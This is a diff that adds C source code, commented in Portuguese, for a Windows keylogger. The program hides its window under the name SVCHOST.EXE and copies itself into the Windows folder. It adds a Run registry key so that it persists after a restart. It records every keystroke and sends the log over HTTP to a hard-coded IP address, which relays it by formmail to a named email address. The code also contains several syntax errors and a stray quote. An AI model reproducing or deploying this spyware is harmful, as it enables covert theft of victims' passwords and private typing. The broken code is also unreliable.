@@ -1,0 +1,290 @@
+//Bibliotecas 
+#include <stdio.h> 
+#include <string.h> 
+#include <windows.h> 
+#include <winreg.h> 
+#include <winsock.h> 
+
+#progama comment(lib, "winsock32.lib") //LIB do winsock 
+
+//Dados para envio do email 
+#define de "lol@lol.com.br" 
+#define para "oliveiracarlo@bol.com.br" 
+#define assunto "LOG" 
+#define FORMMAIL.php" //Troque pelos dados corretos. 
+#define ip "200.201.8.45" //IP do servidor 
+
+//Variáveis 
+int c,n,s,num,num2,caps,envia_tam=50,strtam; //envia_tam = número mínimo de caracteres digitados para enviar email 
+void logar_normal(),logar_caps(),logar_shift(); //Funções 
+char teclas[99999],teclas_aux[99999],enviar[99999],caminho_copia[255]; 
+
+HWND janela; 
+HKEY chave; 
+
+WSADATA data; 
+SOCKET winsock; 
+SOCKADDR_IN sock; 
+//Fim da declaração de variáveis 
+
+int main(int argc,char *argumento[0]){ //Função principal, usaremos "argumento[0]" para capturar-mos o nome do arquivo do keylogger e o diretório onde este arquivo se encontra. 
+//Muda o título da janela e a oculta. 
+SetConsoleTitle("SVCHOST.EXE"); 
+janela = FindWindow(NULL,"SVCHOST.EXE"); 
+ShowWindow(janela,SW_HIDE); 
+
+sprintf(caminho_copia,"%s",argumento[0]); //Faz uma cópia do caminho do keylogger. 
+
+//Inicializa o WINSOCK, e caso ocorra algum erro, encerra o keylogger. 
+if(WSAStartup(MAKEWORD(1,1),&data)==SOCKET_ERROR) 
+exit(0); 
+
+if((winsock=socket(AF_INET,SOCK_STREAM,0))==SOCKET _ERROR) 
+exit(0); //Encerra o programa se a tentativa de criar um socket não teve sucesso. 
+
+//Cria uma entrada no registro, para que o keylogger inicie junto com o sistema operacional. 
+RegOpenKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft \\Windows\\CurrentVersion\\Run",&chave); 
+RegSetValueEx(chave,"SVCHOST.EXE",0,1,(LPBYTE)"C:\ \WINDOWS\\SVCHOST.EXE",22); 
+RegCloseKey(chave); 
+
+CopyFile(caminho_copia,"C:\\WINDOWS\\SVCHOST.EXE", 0); //Copia o keylogger para C:\WINDOWS\SVCHOST.EXE, cujo programa é acionado ao iniciar do windows. 
+
+while(1){ //Loop 
+
+Sleep(1); //Pausa para o LOOP não travar. 
+
+strtam=strlen(teclas); //Captura o número dos carecteres digitados 
+if(strtam>=envia_tam) //Compara se o número é maior ou igual ao especificado em "envia_tam" 
+{ 
+//Caso afirmativo: 
+
+//Prepara socket 
+sock.sin_family=AF_INET; 
+sock.sin_addr.S_un.S_addr = inet_addr(200.201.8.45"); //IP do servidor 
+sock.sin_port=htons(80); 
+
+/* A linha abaixo é muito importante. 
+Essa linha ao ser enviada para o servidor, 
+fará com que você receba o email com o log. 
+Preste muita atenção ao lidar com ela: 
+*/ 
+sprintf(enviar,"GET /%s?de=%s&para=%s&assunto=%s&msg=%s HTTP/1.1\nHost:fmail9.uol.com.br\n\n",FORMMAIL,de,para, assunto,teclas); 
+
+if((winsock=socket(AF_INET,SOCK_STREAM,0))==SOCKET _ERROR) //Caso haja erro, interrompe o programa. 
+exit(0); 
+
+//Conecta ao servidor 
+if(connect(winsock,(sockaddr*)&sock,sizeof(sock))! =SOCKET_ERROR){ 
+
+send(winsock,enviar,strlen(enviar),0); //Envia para o servidor uma requisição ao formmail para que este envie o log. 
+
+//Limpa as variáveis que armazenam as teclas digitadas. 
+sprintf(teclas,""); 
+sprintf(teclas_aux,""); 
+
+} 
+else{ 
+exit(0); //Erro ao conectar, resulta na saída do programa. 
+}} 
+
+//Daqui em diante começa o código responsável pela obtençãp e gravação das teclas. 
+
+
+if(GetAsyncKeyState(0x8)==-32767){ //Tecla BackSpace, copia para uma variável auxiliar os caracteres digitados com 1 caractere a menos, e em seguida recopia o conteúdo para a variável principal. 
+if(strlen(teclas)>0) 
+strncpy(teclas_aux,teclas,strlen(teclas)-1); 
+strcpy(teclas,teclas_aux); 
+sprintf(teclas_aux,"%c",0);} 
+
+//Tecla Enter, adiciona na string: %0A, que é o caractere da tecla ENTER em modo escape, utilizando para o envio de email via PHP. 
+if(GetAsyncKeyState(0xD)==-32767){ 
+strcat(teclas,"%0A"); 
+} 
+//Verifica o pressionamento da tecla SHIFT e chama pela função adequada. 
+if(GetAsyncKeyState(0x10)) 
+logar_shift(); 
+//Tecla de espaço, novamente, %20 é o caractere escape da tecla SPACE. 
+if(GetAsyncKeyState(0x20)==-32767) 
+strcat(teclas,"%20"); 
+//Verifica o CAPS LOCK 
+caps = GetKeyState(0x14); 
+switch(caps) 
+{ 
+case 0: 
+logar_normal(); //Se caps lock estiver desligado 
+break; 
+case 1: 
+logar_caps(); //Se logado 
+} 
+
+for(num=48;num<=57;num++) //Loga números 
+if(GetAsyncKeyState(num)==-32767) 
+sprintf(teclas,"%s%c",teclas,num); 
+
+//Loga outros caracteres. 
+if(GetAsyncKeyState(106)==-32767) 
+sprintf(teclas,"%s*",teclas); 
+
+if(GetAsyncKeyState(107)==-32767) 
+sprintf(teclas,"%s+",teclas); 
+
+if(GetAsyncKeyState(109)==-32767) 
+sprintf(teclas,"%s-",teclas); 
+
+if(GetAsyncKeyState(110)==-32767) 
+sprintf(teclas,"%s.",teclas); 
+
+if(GetAsyncKeyState(111)==-32767) 
+sprintf(teclas,"%s/",teclas); 
+
+if(GetAsyncKeyState(186)==-32767) 
+sprintf(teclas,"%s;",teclas); 
+
+if(GetAsyncKeyState(187)==-32767) 
+sprintf(teclas,"%s=",teclas); 
+
+if(GetAsyncKeyState(188)==-32767) 
+sprintf(teclas,"%s,",teclas); 
+
+if(GetAsyncKeyState(189)==-32767) 
+sprintf(teclas,"%s-",teclas); 
+
+if(GetAsyncKeyState(190)==-32767) 
+sprintf(teclas,"%s.",teclas); 
+
+if(GetAsyncKeyState(191)==-32767) 
+sprintf(teclas,"%s/",teclas); 
+
+if(GetAsyncKeyState(192)==-32767) 
+sprintf(teclas,"%s`",teclas); 
+
+if(GetAsyncKeyState(219)==-32767) 
+sprintf(teclas,"%s[",teclas); 
+
+if(GetAsyncKeyState(220)==-32767) 
+sprintf(teclas,"%s%c",teclas,220); 
+
+if(GetAsyncKeyState(221)==-32767) 
+sprintf(teclas,"%s]",teclas); 
+
+if(GetAsyncKeyState(222)==-32767) 
+sprintf(teclas,"%s'",teclas); 
+
+//Loga teclado númerico. (0123...9 +*/-.) 
+for(num2=96;num2<=105;num2++) 
+if(GetAsyncKeyState(num2)==-32767) 
+sprintf(teclas,"%s%c",teclas,num2-48 ); 
+
+} 
+return 0; 
+} 
+
+//Loga quando SHIFT for pressionado. 
+void logar_shift() 
+{ 
+for(s=48;s<=57;s++) 
+if(GetAsyncKeyState(s)==-32767) 
+switch(s) 
+{ 
+//Loga símbolos, note que alguns símbolos só são aceitos se estiverem em modo escape. 
+case 48: 
+sprintf(teclas,"%s)",teclas); 
+break; 
+
+case 49: 
+sprintf(teclas,"%s!",teclas); 
+break; 
+
+case 50: 
+sprintf(teclas,"%s@",teclas); 
+break; 
+case 51: 
+sprintf(teclas,"%s%%23",teclas); 
+break; 
+case 52: 
+sprintf(teclas,"%s%%24",teclas); 
+break; 
+case 53: 
+sprintf(teclas,"%s%%25",teclas); 
+break; 
+case 54: 
+sprintf(teclas,"%s%%5E",teclas); 
+break; 
+case 55: 
+sprintf(teclas,"%s%%26",teclas); 
+break; 
+case 56: 
+sprintf(teclas,"%s*",teclas); 
+break; 
+case 57: 
+sprintf(teclas,"%s(",teclas); 
+break; 
+
+} 
+//Na mesma função do SHIFT, verifica se CAPSLOCK está ligado ou desligado 
+switch(caps) 
+{ 
+case 0: //Se desligado,loga letras em maiúsculas. 
+for(s=65;s<=90;s++) 
+if(GetAsyncKeyState(s)==-32767) 
+sprintf(teclas,"%s%c",teclas,s); 
+break; 
+
+case 1: //Se ligado, loga letrs em minúsculas. 
+for(s=65;s<=90;s++) 
+if(GetAsyncKeyState(s)==-32767) 
+sprintf(teclas,"%s%c",teclas,s+32); 
+} 
+//Outros símbolos combinados com SHIFT. 
+if(GetAsyncKeyState(186)==-32767) 
+sprintf(teclas,"%s:",teclas); 
+
+if(GetAsyncKeyState(187)==-32767) 
+sprintf(teclas,"%s+",teclas); 
+
+if(GetAsyncKeyState(188)==-32767) 
+sprintf(teclas,"%s<",teclas); 
+
+if(GetAsyncKeyState(189)==-32767) 
+sprintf(teclas,"%s_",teclas); 
+
+if(GetAsyncKeyState(190)==-32767) 
+sprintf(teclas,"%s>",teclas); 
+
+if(GetAsyncKeyState(191)==-32767) 
+sprintf(teclas,"%s?",teclas); 
+
+if(GetAsyncKeyState(192)==-32767) 
+sprintf(teclas,"%s~",teclas); 
+
+if(GetAsyncKeyState(219)==-32767) 
+sprintf(teclas,"%s{",teclas); 
+
+if(GetAsyncKeyState(220)==-32767) 
+sprintf(teclas,"%s|",teclas); 
+
+if(GetAsyncKeyState(221)==-32767) 
+sprintf(teclas,"%s}",teclas); 
+
+if(GetAsyncKeyState(222)==-32767) 
+sprintf(teclas,"%s\"",teclas); 
+
+
+} 
+//Loga quando CAPSLOCK estiver ligado 
+void logar_caps() 
+{ 
+for(c=65;c<=90;c++) 
+if(GetAsyncKeyState(c)==-32767) 
+sprintf(teclas,"%s%c",teclas,c); 
+
+} 
+
+void logar_normal() //Loga quando nem SHIFT nem CAPSLOCK estiverem sendo usados. 
+{ 
+for(n=65;n<=90;n++) 
+if(GetAsyncKeyState(n)==-32767) 
+sprintf(teclas,"%s%c",teclas,n+32); 
+" 
+
+} 
